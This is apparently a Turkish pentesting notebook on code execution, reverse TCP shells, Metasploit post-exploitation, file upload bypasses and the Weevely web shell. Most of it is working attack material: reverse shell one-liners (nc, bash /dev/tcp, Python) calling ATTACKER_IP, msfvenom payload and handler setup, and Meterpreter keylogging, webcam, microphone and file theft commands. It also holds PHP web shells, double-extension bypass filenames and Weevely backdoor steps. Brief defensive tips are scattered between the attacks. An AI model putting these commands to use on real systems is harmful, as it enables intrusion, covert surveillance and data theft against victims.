Kod Uygulama Açığı (Code Execution Vulnerability) Nedir?
Kod uygulama açığı (Code Execution Vulnerability), bir saldırganın bir web uygulamasında kendi zararlı kodunu çalıştırmasına olanak tanıyan bir güvenlik açığıdır. Genellikle Remote Code Execution (RCE) veya Local File Inclusion (LFI to RCE) gibi kategorilere ayrılır.

Kod Uygulama Açığı Türleri
1️⃣ Uzaktan Kod Çalıştırma (RCE - Remote Code Execution)
📌 Tanım: Saldırgan, hedef sunucuda uzaktan kendi kodunu çalıştırabilir.
📍 Örnek Senaryo:
Bir PHP web uygulamasında, kullanıcı girişinden alınan veri eval() fonksiyonuna kontrolsüz şekilde gönderiliyorsa, saldırgan PHP kodu çalıştırabilir.
php
php
$kod = $\_GET['cmd'];
eval($kod); // KESİNLİKLE KULLANILMAMASI GEREKEN BİR YÖNTEM!
?
Saldırganın isteği:
css
https://example.com/vuln.php?cmd=phpinfo();
Bu, phpinfo() komutunu çalıştırarak sistem bilgilerini ele geçirir. Daha kötüsü, shell erişimi sağlayabilir.
✅ Korunma Yöntemleri:
eval(), exec(), system() gibi fonksiyonları doğrudan kullanmamak.
Kullanıcı girdisini sanitize etmek (örneğin escapeshellarg() veya htmlspecialchars() kullanımı).

2️⃣ Yerel Kod Çalıştırma (LCE - Local Code Execution)
📌 Tanım: Web sunucusunda çalışan bir betiğin, istemeden zararlı kod çalıştırmasına neden olan açık.
📍 Örnek Senaryo:
Bir dosya yükleme formunda saldırgan zararlı bir .php dosyası yükleyerek çalıştırabilir.
php
move\_uploaded\_file($\_FILES['file']['tmp\_name'], "uploads/" . $\_FILES['file']['name']);
Burada yüklenen shell.php dosyası doğrudan çalıştırılabilir:
arduino
https://example.com/uploads/shell.php
✅ Korunma Yöntemleri:
Dosya uzantılarını ve MIME türlerini kontrol etmek.
Dosyaları çalıştırılabilir dizinlere kaydetmemek (örn: uploads/ klasörü içinde .htaccess ile php çalışmasını engellemek).

3️⃣ Komut Enjeksiyonu (Command Injection)
📌 Tanım: Kullanıcı girdisi, bir sistem komutu olarak doğrudan çalıştırıldığında meydana gelir.
📍 Örnek Senaryo:
php
php
$host = $\_GET['host'];
echo shell\_exec("ping -c 4 " . $host);
?
Saldırganın isteği:
bash
https://example.com/ping.php?host=;cat /etc/passwd
Bu, sistemde cat /etc/passwd komutunun çalışmasına neden olabilir.
✅ Korunma Yöntemleri:
Kullanıcı girdisini beyaz liste mantığıyla filtrelemek.
escapeshellcmd() ve escapeshellarg() gibi güvenlik fonksiyonlarını kullanmak.

Sonuç
🔴 Kod uygulama açıkları, sistem üzerinde tam kontrol sağlayabilir ve en tehlikeli zafiyet türlerinden biridir.
🛡 Girdileri sanitize etmek, güvenlik önlemleri almak ve güvenlik odaklı kodlama yapmak en iyi korunma yöntemleridir.










Ters TCP (Reverse TCP) Nedir?
Ters TCP bağlantısı, saldırganın doğrudan hedef makineye bağlanmak yerine, hedef makinenin saldırgana bağlantı başlattığı bir tekniktir. Bu yöntem genellikle güvenlik duvarlarını aşmak ve NAT arkasındaki sistemlere erişim sağlamak için kullanılır.

Ters TCP ile Bağlantı Kurma Komutları
1️⃣ Netcat (nc) ile Ters TCP Bağlantısı
📍 Hedef Makinede (Kurbandan Giden Bağlantı) Çalıştırılacak Komut:
bash
nc -e /bin/bash ATTACKER\_IP 4444
ATTACKER\_IP: Saldırganın IP adresi
4444: Saldırganın dinlediği port
📍 Saldırganın Makinesinde (Bağlantıyı Dinleme)
bash
nc -lvp 4444
Bu komut, saldırganın sisteminde bir "listener" açarak bağlantıyı beklemesini sağlar.

2️⃣ Bash ile Ters TCP Bağlantısı
Hedef makinede Bash kullanılarak ters bağlantı sağlamak için:
bash
bash -i >& /dev/tcp/ATTACKER\_IP/4444 0>&1
Bu komut, saldırganın makinesine bir ters bağlantı açar.

3️⃣ Python ile Ters TCP Bağlantısı
Eğer hedef sistemde Python yüklüyse:
python
import socket, subprocess, os
s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
s.connect(("ATTACKER\_IP", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/bash", "-i"])
Bu Python betiği, saldırganın makinesine bağlanarak bir shell açar.

4️⃣ Metasploit ile Ters TCP Payload
📌 Metasploit Framework’te Ters TCP Reverse Shell oluşturmak için:
bash
msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=ATTACKER\_IP LPORT=4444 -f elf > shell.elf
Hedef sistem bu dosyayı çalıştırırsa, saldırgana bağlantı açar.
📍 Metasploit Listener Açma:
bash
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse\_tcp
set LHOST ATTACKER\_IP
set LPORT 4444
exploit

Ters TCP’nin Avantajları
✅ Güvenlik duvarlarını ve NAT’ı aşabilir.
✅ Hedef sistemin gelen bağlantıları engellemesi halinde çalışabilir.
✅ Gizlilik açısından, bağlantıyı kurban başlattığı için daha az fark edilir.
Ters TCP’den Korunma Yöntemleri
🔹 Gereksiz portları kapat.
🔹 IDS/IPS ile şüpheli bağlantıları tespit et.
🔹 Anti-malware yazılımlarıyla izinsiz shell erişimlerini engelle.
🔹 Uygulamalarda güvenli kodlama yaparak RCE ve komut enjeksiyonlarını önle
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Ters TCP bağlantısını başarılı bir şekilde gerçekleştirdikten sonra, gelen bilgileri görmek ve yönetmek için kullanılan yöntemler, kullanılan araca göre değişir. İşte farklı araçlarla gelen bilgileri nasıl görebileceğinize dair adım adım açıklamalar:

1️⃣ Netcat (nc) ile Gelen Verileri Görme
Ters TCP bağlantısı kurulduğunda, saldırgan tarafında çalışan Netcat dinleyiciye bağlanır. Gelen bilgileri görmek için dinleyici (listener) terminalinde komutlar çalıştırabilirsiniz.
📌 Saldırganın Makinesinde (Bağlantıyı Dinleme)
bash
nc -lvp 4444

📌 Hedef Makinede (Ters TCP Bağlantısını Açma)
bash
nc -e /bin/bash ATTACKER\_IP 4444
Bağlantı başarılı olursa, saldırgan makinesindeki nc terminalinde hedef makinenin shell erişimi sağlanır. Burada ls, whoami, uname -a gibi komutlarla bilgileri görebilirsiniz.

2️⃣ Bash ile Gelen Verileri Görme
Bash üzerinden ters bağlantı sağladıktan sonra, aynı şekilde terminalden komutlar girerek hedef makineden gelen verileri okuyabilirsiniz.
📌 Bağlantı Açıldığında Kullanılabilecek Komutlar:
bash
whoami # Kullanıcı adını öğrenme 
uname -a # İşletim sistemi bilgilerini görme 
pwd # Hangi dizinde olduğunuzu kontrol etme 
ls -la # Hedef makinedeki dosyaları listeleme 
cat /etc/passwd # Kullanıcı listesini görme 
Eğer bağlantıyı bash -i >& /dev/tcp/ATTACKER\_IP/4444 0>&1 gibi bir yöntemle aldıysanız, bu komutları terminalinizde çalıştırarak hedef sistem hakkında bilgi edinebilirsiniz.

3️⃣ Python ile Gelen Verileri Görme
Python ile oluşturulan ters TCP bağlantısı sonrası, bağlantıyı yöneten terminalde yine komut çalıştırarak verileri görebilirsiniz.
📌 Hedef Makinede Python Reverse Shell Çalıştırıldıysa:
python
import socket,subprocess,os
s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM)
s.connect(("ATTACKER\_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
📌 Saldırganın Makinesinde Bağlantıyı Dinleme:
bash
nc -lvp 4444
Bağlantı başarılı olduktan sonra, terminalinizden komutları çalıştırarak sistemdeki dosyalara, süreçlere ve kullanıcı bilgilerine erişebilirsiniz.

4️⃣ Metasploit ile Gelen Verileri Görme
Eğer Metasploit Framework (MSF) kullanıyorsanız, "Meterpreter" bağlantısı üzerinden gelen bilgileri yönetebilirsiniz.
📌 Bağlantıyı Dinlemek için:
bash
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse\_tcp
set LHOST ATTACKER\_IP
set LPORT 4444
exploit
Bağlantı sağlandıktan sonra aşağıdaki Meterpreter komutlarını kullanabilirsiniz:
sysinfo → Hedef sistem bilgilerini gösterir.
getuid → Hangi kullanıcı olarak bağlı olduğunuzu gösterir.
pwd → Mevcut dizini gösterir.
ls → Bulunduğunuz dizindeki dosyaları listeler.
download  → Hedef sistemden dosya indirir.
upload  → Hedef sisteme dosya yükler.
shell → Normal sistem shelline geçiş yapar.
📌 Örnek Çıktı:
bash
meterpreter > sysinfo
Computer : target.local
OS : Linux (Ubuntu 22.04)
Meterpreter : x86/linux
Bu komutlarla hedef sistemdeki bilgileri daha detaylı görebilir ve yönetebilirsiniz.

5️⃣ Ters TCP Bağlantısından Gelen Bilgileri Dosyaya Kaydetme
Eğer terminal üzerinden gelen verileri kaydetmek istiyorsanız, aşağıdaki yöntemleri kullanabilirsiniz.
📌 Netcat ile Gelen Verileri Dosyaya Kaydetme:
bash
nc -lvp 4444 > log.txt
Bağlantı kurulduğunda tüm gelen bilgiler log.txt dosyasına kaydedilir.
📌 Metasploit ile Gelen Verileri Kaydetme:
bash
set AutoRunScript post/windows/manage/migrate
Bu ayar, bağlantı sonrası belirli komutları otomatik çalıştırarak bilgileri kaydetmeye yardımcı olur.

Sonuç
Ters TCP bağlantısı sağlandıktan sonra, gelen bilgileri görmek için terminal üzerinde çalıştırılabilecek komutlar: ✅ Netcat (nc) ile bağlantıyı dinleme ve shell komutları çalıştırma.
✅ Bash veya Python reverse shell üzerinden sistem bilgilerini alma.
✅ Metasploit Meterpreter kullanarak daha detaylı kontrol sağlama.
✅ Elde edilen bilgileri dosyaya kaydetme.
Her yöntemde, komut satırından manuel olarak komutlar çalıştırarak hedef sistem hakkında bilgi toplayabilir ve verileri görüntüleyebilirsiniz.
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Metasploit ile Dinleme Hakkında Daha fazla Bilgi;
Metasploit ile Gelen Verileri Görme
Metasploit Framework (MSF) kullanarak ters TCP bağlantısı sağladıktan sonra, gelen verileri Meterpreter oturumu üzerinden yönetebilir ve görüntüleyebilirsiniz. İşte adım adım Metasploit ile gelen bilgileri görme süreci:

1️⃣ Exploit Handler ile Bağlantıyı Dinleme
Öncelikle, Metasploit içinde multi/handler modülünü kullanarak ters bağlantıyı dinlemelisin.
📌 Terminalde Metasploit'i Aç:
bash
msfconsole
📌 Exploit Modülünü Seç:
bash
use exploit/multi/handler
📌 Payload'ı Ayarla:
Hedef makineye uygun bir reverse shell payload ayarlamalısın.
🔹 Windows için:
bash
set payload windows/meterpreter/reverse\_tcp
🔹 Linux için:
bash
set payload linux/x86/meterpreter/reverse\_tcp
📌 Dinleyici IP ve Port'u Belirle:
bash
set LHOST ATTACKER\_IP
set LPORT 4444
📌 Exploit’i Çalıştır:
bash
exploit
Bunu yaptıktan sonra, hedef makine ters bağlantıyı başlattığında, Meterpreter shell erişimi sağlanacaktır.

2️⃣ Meterpreter ile Gelen Verileri Görme
Bağlantı kurulduktan sonra hata ayıklama, sistem bilgilerini görme ve dosya yönetimi gibi işlemler yapabilirsin.
📌 Hedef Sistemin Bilgilerini Görme:
bash
sysinfo
Örnek Çıktı:
bash
Computer : target-PC
OS : Windows 10 (10.0 Build 19045)
Meterpreter : x64/windows
📌 Hangi Kullanıcı Olarak Bağlandığını Kontrol Etme:
bash
getuid
Örnek Çıktı:
bash
Server username: NT AUTHORITY\SYSTEM
Bu, saldırganın admin veya normal kullanıcı olarak bağlanıp bağlanmadığını anlamasına yardımcı olur.
📌 Hedef Makinenin Ağ Bilgilerini Görme:
bash
ipconfig
Bu komut, hedefin ağ arayüzlerini, IP adreslerini ve ağ bağlantılarını listeler.
📌 Çalışan Süreçleri (Process) Görme:
bash
ps
Bu komut, hedef sistemde çalışan tüm işlemleri ve PID'lerini (Process ID) listeler.
📌 Kullanıcıları Listeleme:
bash
run post/windows/gather/enum\_logged\_on\_users
Hedef sistemde aktif olarak oturum açmış kullanıcıları listeler.

3️⃣ Dosya Yönetimi ve Log Alma
Metasploit ile hedef makinenin dosya sistemine erişebilir, verileri alabilir veya kayıt altına alabilirsin.
📌 Bulunduğun Dizini Görme:
bash
pwd
📌 Hedef Makinedeki Dosyaları Listeleme:
bash
ls
📌 Dosya İçeriğini Görme:
bash
cat C:\\Users\\Admin\\Desktop\\passwords.txt
📌 Hedef Makineden Dosya Çekme (Download):
bash
download C:\\Users\\Admin\\Desktop\\passwords.txt
📌 Dosya Yükleme (Upload):
bash
upload payload.exe C:\\Users\\Admin\\Documents\\

4️⃣ Keylogger ile Gelen Verileri Görme
Eğer hedef sistemde yazılanları görmek istiyorsan, Metasploit'in keylogger modülünü kullanabilirsin.
📌 Keylogger Başlatma:
bash
keyscan\_start
Bu komut ile hedef sistemde girilen klavye girişlerini kaydetmeye başlarsın.
📌 Kaydedilen Klavye Girişlerini Görme:
bash
keyscan\_dump
📌 Keylogger'ı Durdurma:
bash
keyscan\_stop

5️⃣ Ekran Görüntüsü ve Web Kamerası Görüntüleme
Hedef sistemde görsel veri toplamak için ekran görüntüsü alma veya web kamerasını kontrol etme gibi işlemler yapılabilir.
📌 Ekran Görüntüsü Alma:
bash
screenshot
📌 Web Kamerasını Açma ve Görüntü Alma:
bash
webcam\_list # Hedef makinedeki kameraları listeler 
webcam\_snap # Kamera görüntüsünü alır 
webcam\_stream # Kameradan canlı yayın alır 

6️⃣ Ses Kaydı Alarak Gelen Verileri Görme
📌 Hedef Makinenin Mikrofonunu Kullanarak Ses Kaydı Alma:
bash
record\_mic -d 10
Bu komut, 10 saniyelik ses kaydı alır ve kaydedilen sesi hedef makineden çekebilirsin.

7️⃣ Arka Plan Sürecine Alarak Daha Sonra Verileri Görme
Bağlantıyı koparmadan arka plana alıp geri dönmek için:
📌 Meterpreter Oturumunu Arka Plana Alma:
bash
background
📌 Aktif Oturumları Listeleme:
bash
sessions -i
📌 Belirli Bir Oturuma Geri Dönme:
bash
sessions -i 1
Burada "1", aktif oturum ID'sidir.

Sonuç
Metasploit ile hedef sistemden gelen bilgileri görüntülemek ve analiz etmek için kullanabileceğin temel komutlar:
✅ sysinfo – Sistem bilgilerini görüntüler.
✅ getuid – Kullanıcı bilgilerini gösterir.
✅ ipconfig – Ağ bilgilerini listeler.
✅ ps – Çalışan işlemleri gösterir.
✅ keyscan\_start ve keyscan\_dump – Keylogger başlatıp verileri alır.
✅ screenshot – Ekran görüntüsü alır.
✅ webcam\_snap – Kamera görüntüsü alır.
✅ record\_mic – Mikrofon kaydı yapar.
✅ download – Hedef sistemden dosya çeker.
✅ upload – Hedef sisteme dosya yükler.
✅ sessions -i – Aktif oturumları listeler.
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Web Sitelerinde Dosya Yükleme Açıkları
Bir web sitesine dosya yükleme özelliği, profil resmi yükleme, belge gönderme, form ekleri vb. gibi birçok işleve sahiptir. Ancak, bu özellik doğru şekilde güvenli hale getirilmezse uzaktan kod çalıştırma (RCE), web shell yükleme, XSS ve diğer güvenlik risklerine yol açabilir.

📌 1. Dosya Yükleme Açıkları Türleri
1️⃣ Dosya Uzantısı Kontrolünün Bypass Edilmesi
Web uygulamaları genellikle yalnızca belirli türdeki dosyaların yüklenmesine izin verir (örn: .jpg, .png, .pdf). Ancak, bu filtreleme yöntemleri bazen yanlış uygulanır ve bypass edilebilir.
Çift uzantı kullanımı:
perl
shell.php.jpg
shell.php%00.jpg
shell.php%20.jpg
Eğer sunucu dosya uzantısını yalnızca son kısımdan kontrol ediyorsa, .php uzantısı sunucu tarafında işlenebilir.
İçerik türü (MIME Type) değişimi:
Tarayıcının Content-Type başlığını değiştirerek filtreyi atlatma.
Burp Suite gibi araçlarla image/jpeg yerine application/x-php kullanma.
Beyaz liste yerine siyah liste kullanımı:
Örneğin, .exe yasaklanmış ama .php5, .phtml gibi uzantılar yasaklanmamış olabilir.

2️⃣ Yüklenen Dosyanın Direkt Erişilebilir Olması
Bazı web siteleri, yüklenen dosyaları belirli bir dizinde saklar ve dosyanın URL'sini doğrudan erişilebilir hale getirir.
Örneğin, bir dosya şu dizine yükleniyorsa:
arduino
https://target.com/uploads/shell.php
Eğer PHP dosyaları çalıştırılabiliyorsa, saldırgan bu dosyayı çalıştırarak uzaktan kod çalıştırma (RCE) gerçekleştirebilir.
Eğer sunucu .php dosyalarını çalıştırmıyorsa, ancak .htaccess dosyaları destekliyorsa:
htaccess
AddType application/x-httpd-php .jpg
Bu şekilde .jpg gibi uzantıları PHP kodu çalıştıracak şekilde değiştirmek mümkün olabilir.

3️⃣ İçerik Doğrulama Eksiklikleri
1.Bazı uygulamalar dosya uzantısını ve MIME türünü kontrol etse bile, dosya içeriğini doğrulamaz.
PHP Shell İçeren Bir Görsel Yüklemek:
1.Bir JPG dosyasına PHP kodu ekleyerek yükleme:
php
php system($\_GET['cmd']); ?
2.Eğer sunucu yalnızca ilk birkaç byte’ı kontrol ediyorsa, dosya şu şekilde olabilir:
php
[Görüntü Başlığı Verisi]
php system($\_GET['cmd']); ?
3.Sunucu görüntü kontrolünü atladıysa, yüklenen dosya çalıştırılabilir hale gelir.

4️⃣ Dosya Yükleme Konumunun Güvenli Olmaması
Yüklenen dosyaların kullanıcıya özel bir dizinde olmaması veya rastgele isimlendirilmemesi, saldırganın başkalarının dosyalarına erişmesine neden olabilir.
Dosya adı tahmin edilebiliyorsa (uploads/image.png gibi), saldırgan yüklenen dosyalara erişebilir.
🔹 Çözüm: Yüklenen dosyalara erişimi engellemek için UUID tabanlı dosya isimlendirme veya erişim kontrolleri (örneğin, AWS S3 presigned URLs) kullanılmalıdır.

5️⃣ EXIF ve Metadata Tabanlı Saldırılar
Görsel veya doküman dosyalarının içine zararlı komutlar gömülebilir.
ExifTool gibi araçlarla JPG/PNG dosyalarına komut eklenebilir:
bash
exiftool -Comment="php system($\_GET['cmd']); ?" shell.jpg
Eğer web uygulaması EXIF verilerini okuyor ve eval() gibi bir PHP fonksiyonu kullanıyorsa, komut yürütme (RCE) oluşabilir.

📌 2. Dosya Yükleme Açıkları Nasıl Test Edilir?
🔍 1️⃣ Güvenlik Kontrollerini Bypass Denemeleri
.php, .phtml, .php5, .asp, .jsp gibi uzantıları test et.
Çift uzantı denemeleri yap (shell.php.jpg).
MIME türünü değiştirerek yükleme denemeleri yap.
Yüklenen dosyanın doğrudan erişilebilir olup olmadığını kontrol et (uploads/ dizini var mı?).
🔍 2️⃣ Web Shell ve RCE Testleri
Bir PHP web shell yükleyerek komut çalıştırılabiliyor mu test et.
📌 Örnek PHP Web Shell (shell.php)
php
php system($\_GET['cmd']); ?
Eğer şu URL üzerinden komut çalıştırılabiliyorsa:
bash
https://target.com/uploads/shell.php?cmd=whoami
Bu, uzaktan kod çalıştırma (RCE) açığı olduğunu gösterir.

📌 3. Korunma Yöntemleri
✅ Beyaz Liste Kullan:
Yalnızca .jpg, .png, .pdf gibi güvenli dosya türlerine izin ver.
Dosya uzantılarını sunucu tarafında kontrol et.
✅ MIME Türünü ve İçeriği Doğrula:
file komutunu veya finfo\_file() fonksiyonunu kullanarak içeriği doğrula.
✅ Yüklenen Dosyaları Rastgele Adlandır:
Kullanıcının yüklediği dosyaları random\_string.jpg gibi isimlendirerek saldırganın dosya yolunu tahmin etmesini engelle.
✅ Yüklenen Dosyaları Doğrudan Erişilebilir Yapma:
Yüklenen dosyaları web erişimine kapalı bir dizinde tut ve dosyaları almak için bir sunucu tarafı betiği kullan.
✅ Web Sunucu Konfigürasyonunu Koru:
.htaccess dosyalarını kapat (AllowOverride None).
php\_flag engine off ile .php dosyalarının çalıştırılmasını engelle.
✅ EXIF ve Metadata Analizi Yap:
exiftool ile yüklenen dosyaların EXIF metadata içeriğini temizle.
✅ Dosya Boyutunu Kontrol Et:
Büyük boyutlu dosyaların yüklenmesini sınırlayarak DDoS saldırılarını önle.

📌 4. Sonuç
Web sitelerindeki dosya yükleme açıkları, saldırganların sisteme zararlı dosya yükleyerek uzaktan komut çalıştırmasına (RCE), web shell oluşturmasına veya hassas verilere erişmesine yol açabilir.
⚠ Test yaparken dikkat edilmesi gerekenler:
MIME türü ve uzantı kontrolü bypass edilebilir mi?
Dosya içerik analizi yapılıyor mu?
Web shell veya RCE mümkün mü?
Yüklenen dosyanın URL’sine doğrudan erişilebiliyor mu?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Weevely Nedir?
Weevely, Python tabanlı bir PHP web shell ve post-exploitation aracıdır. Hafif, gizli ve şifrelenmiş bir arka kapı (backdoor) sağlayarak, saldırganın web sunucusu üzerinde uzaktan komut çalıştırmasını ve çeşitli saldırılar gerçekleştirmesini mümkün kılar.
Weevely, özellikle bir web sitesinde dosya yükleme açığı bulunması durumunda saldırganın bir web shell yükleyerek sunucu kontrolü elde etmesine yardımcı olur.

📌 Weevely'nin Özellikleri
✔ Şifreli ve gizli PHP Web Shell (Trafik şifrelenir ve tespit edilmesi zordur)
✔ Post-Exploitation Araçları içerir (dosya yöneticisi, veritabanı yönetimi, ters bağlantı vb.)
✔ Gizli ve Kompakt (PHP shell boyutu yaklaşık 1 KB)
✔ Sunucuda Python veya Bash ihtiyacı yok (Çünkü PHP ile çalışır)
✔ Ekstra Modüllerle Genişletilebilir

📌 Weevely Nasıl Kullanılır?
1️⃣ Weevely Kurulumu
Weevely genellikle Kali Linux’ta önceden kurulu gelir, ancak yoksa aşağıdaki komutla yüklenebilir:
bash
git clone https://github.com/epinna/weevely3.git
cd weevely3
pip install -r requirements.txt


2️⃣ PHP Web Shell (Backdoor) Oluşturma
Hedef sisteme yüklenecek PHP dosyasını oluşturmak için:
bash
weevely generate ŞİFRE shell.php
📌 Örnek:
bash
weevely generate mysecretpass shell.php

Bu komut şifrelenmiş bir PHP dosyası (shell.php) oluşturur.

3️⃣ PHP Shell'i Hedef Web Sitesine Yükleme
Shell.php dosyasını hedef siteye yükleyebileceğin bir dosya yükleme açığı bulunmalıdır.
Yüklendikten sonra, shell’in bulunduğu URL’yi belirlemelisin:
arduino
KopyalaDüzenle
https://target.com/uploads/shell.php


4️⃣ Weevely ile Web Shell'e Bağlanma
Şimdi oluşturulan backdoor’a bağlanabiliriz:
bash
KopyalaDüzenle
weevely https://target.com/uploads/shell.php mysecretpass

Eğer başarılı olursa, Weevely interaktif bir shell başlatır ve komutları çalıştırabilirsin.






📌 Weevely Kullanım Komutları
🔹 Temel Komutlar:

📌 Weevely ile Post-Exploitation (İleri Seviye Kullanım)
🔹 Ters Bağlantı (Reverse Shell) Alma:
bash
:backdoor\_reversetcp IP PORT
Bunun için önce netcat veya Metasploit ile dinleme yapılmalıdır:
bash
nc -lvnp PORT
🔹 Veritabanı Bağlantısı Kurma:
bash
:db\_connect "mysql://username:password@localhost/database"
Bu, veritabanına doğrudan bağlanarak veri sızdırmaya olanak tanır.
🔹 Keylogger Çalıştırma:
bash
:keylog\_start

Arka planda bir keylogger başlatır ve oturum bilgilerini toplar.


📌 Sonuç
Weevely, saldırganların bir web sitesine yükleyebilecekleri gizli ve güçlü bir PHP shell sunar. Dosya yükleme açıkları veya zafiyetli web sunucuları üzerinden bir kez yüklendiğinde, sistem üzerinde geniş yetkilerle işlem yapma imkanı sağlar.

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

📌 Dosya Barındırma Açıkları Nelerdir?
Dosya barındırma (file hosting) açıkları, saldırganların bir web uygulamasına zararlı dosyalar yükleyerek sistem üzerinde yetkisiz erişim veya kontrol elde etmelerine yol açan güvenlik zaafiyetleridir.
Bu tür açıklar genellikle dosya yükleme ve dosya yönetimi mekanizmalarındaki güvenlik eksikliklerinden kaynaklanır.

🚨 1️⃣ Yaygın Dosya Barındırma Açıkları
1️⃣ Yetkisiz Dosya Yükleme (Unrestricted File Upload)
📌 Açıklama: Web sitesinin, yüklenen dosyanın türünü ve içeriğini düzgün şekilde kontrol etmemesi sonucu saldırganın zararlı bir dosya yüklemesine izin vermesi.
📌 Örnek:
.php, .jsp, .aspx gibi çalıştırılabilir dosyaların yüklenmesi
JavaScript içeren zararlı SVG veya PDF dosyalarının yüklenmesi
Web shell (örneğin, Weevely, b374k, WSO shell) yüklenmesi
🔹 Korunma Yöntemleri:
✅ Dosya uzantılarını beyaz liste yöntemiyle kontrol et (örneğin, sadece .jpg, .png, .pdf izin ver)
✅ Dosya içerik tipini (MIME Type) doğrula
✅ Yüklenen dosyaların yürütülebilir dizinlere kaydedilmesini engelle

2️⃣ Dosya İsmi Manipülasyonu (File Name Spoofing)
📌 Açıklama: Saldırganın dosya uzantısını değiştirerek sistemin dosyayı güvenli sanmasını sağlaması.
📌 Örnek:
shell.php.jpg olarak bir dosya yüklenmesi ve sistemin .jpg sanarak kabul etmesi
Unicode karakterler kullanarak "php" uzantısını gizleme (shell.jpg%00.php)
🔹 Korunma Yöntemleri:
✅ Dosya uzantısını sunucu tarafında kontrol et
✅ Kullanıcının girdiği dosya ismine güvenme, rastgele isimlendirme yap
✅ Apache/Nginx "AddHandler" gibi komutlarla yürütülebilir dosya türlerini devre dışı bırak

3️⃣ Depolanan XSS (Stored XSS) ile Dosya Yükleme
📌 Açıklama: Yüklenen dosyanın içeriğine zararlı JavaScript kodu eklenmesi ve diğer kullanıcıların bu dosyayı açtığında kodun çalıştırılması.
📌 Örnek:
Zararlı bir SVG veya PDF dosyasının içine XSS payload eklenmesi
HTML dosyasının içine alert('XSS') gibi zararlı kod yerleştirilmesi
🔹 Korunma Yöntemleri:
✅ Yüklenen dosya içeriğini tarayarak zararlı kod olup olmadığını kontrol et
✅ Kullanıcıların yüklenen dosyaları görüntülemesini engellemek için Content-Disposition: attachment başlığını kullan

4️⃣ Symbolic Link (Symlink) ve Path Traversal Açıkları
📌 Açıklama: Saldırganın yüklediği dosya aracılığıyla sunucudaki hassas dosyalara erişmesi.
📌 Örnek:
Bir symbolic link kullanarak /etc/passwd dosyasına erişim sağlama
../../../../../etc/passwd ile dizin gezme (path traversal) saldırısı
Yüklenen bir .zip dosyası içinde ../../../../../var/www/html/shell.php yoluyla dosya yerleştirme
🔹 Korunma Yöntemleri:
✅ Kullanıcının yüklediği dosyanın yol bilgilerini temizle
✅ realpath() gibi fonksiyonlar ile dizin geçişlerini engelle
✅ Dosya yükleme dizinini chroot jail gibi yöntemlerle izole et

5️⃣ Kötüye Kullanılabilen PDF ve Office Dosyaları
📌 Açıklama: Bazı dosya türleri, içerisine kötü amaçlı komutlar veya bağlantılar gömülerek saldırı vektörü haline getirilebilir.
📌 Örnek:
PDF içinde zararlı JavaScript kodu
Word dosyası (DOCX) içine makro (VBA) yerleştirme
Excel dosyası (XLSX) içine zararlı DDE kodu ekleme
🔹 Korunma Yöntemleri:
✅ Kullanıcıların yüklediği PDF ve Office dosyalarını antivirüs veya sandbox ortamında tarayın
✅ Yüklenen dosyaları salt okunur olarak açmayı zorunlu kıl

🔎 2️⃣ Dosya Barındırma Açıklarını Tespit Etme
Aşağıdaki yöntemler, bir sistemde dosya yükleme açıklarını test etmek için kullanılabilir:
🛠 Manuel Testler:
✅ Dosya Yükleme Formlarını Denetleme → shell.php, shell.php.jpg gibi dosyalar yüklenerek test edilebilir.
✅ Path Traversal Denemeleri → ../../../../../etc/passwd gibi yollar denenebilir.
✅ Zararlı PDF, SVG, DOCX Dosyaları ile Test

🔍 Otomatik Araçlar:
📌 Burp Suite Intruder & Repeater
📌 FFUF veya Dirbuster ile Yüklenen Dosya Yollarını Tarama
📌 Nuclei ile File Upload Açıklarını Tespit Etme
bash
nuclei -t cves/ -u https://target.com
📌 Metasploit Kullanarak Dosya Yükleme Testleri
bash
use auxiliary/scanner/http/file\_upload
set RHOSTS target.com
exploit


📌 Sonuç
Dosya barındırma açıkları, bir sistemde yetkisiz erişim, veri sızıntısı ve zararlı yazılım çalıştırılması gibi ciddi güvenlik risklerine neden olabilir. Güvenli bir dosya yükleme mekanizması oluşturmak için doğrulama ve filtreleme kontrolleri kesinlikle uygulanmalıdır.


